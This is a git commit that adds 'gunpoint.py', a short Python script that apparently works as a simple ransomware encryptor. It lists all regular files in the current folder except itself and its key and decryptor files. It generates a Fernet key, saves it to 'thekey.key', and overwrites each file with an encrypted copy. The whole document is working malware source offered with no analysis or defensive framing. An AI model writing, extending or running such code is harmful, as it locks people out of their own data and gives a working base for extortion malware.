9f6a57512f5c372715b2b4a212b95b02ffc913a6
Charles1699 <106588386+Charles1699@users.noreply.github.com>
2022-05-31 10:30:56 +0100

    Add files via upload

---
+++ gunpoint.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+
+files = []
+
+for file in os.listdir():
+	if file == "gunpoint.py" or file == "thekey.key" or file == "decrypt1.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+
